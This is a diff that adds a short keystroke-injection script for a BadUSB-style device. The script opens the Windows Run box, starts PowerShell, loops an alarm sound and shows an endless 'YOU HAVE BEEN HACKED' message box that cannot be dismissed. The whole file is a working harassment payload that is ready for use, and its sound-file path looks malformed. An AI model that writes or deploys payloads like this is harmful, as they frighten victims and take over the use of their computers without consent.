@@ -1,0 +1,5 @@
+GUI r
+DELAY 500
+STRING powershell -NoExit -NoP -NonI -Command "Add-Type -AssemblyName PresentationFramework; $sound = New-Object Media.SoundPlayer ('$env:mormi.GAMINGPC12\\Downloads\\alarm.wav'); $sound.PlayLooping(); while ($true) { [System.Windows.MessageBox]::Show('YOU HAVE BEEN HACKED CLICK ON OK TO STOP THIS') }"
+DELAY 500
+ENTER
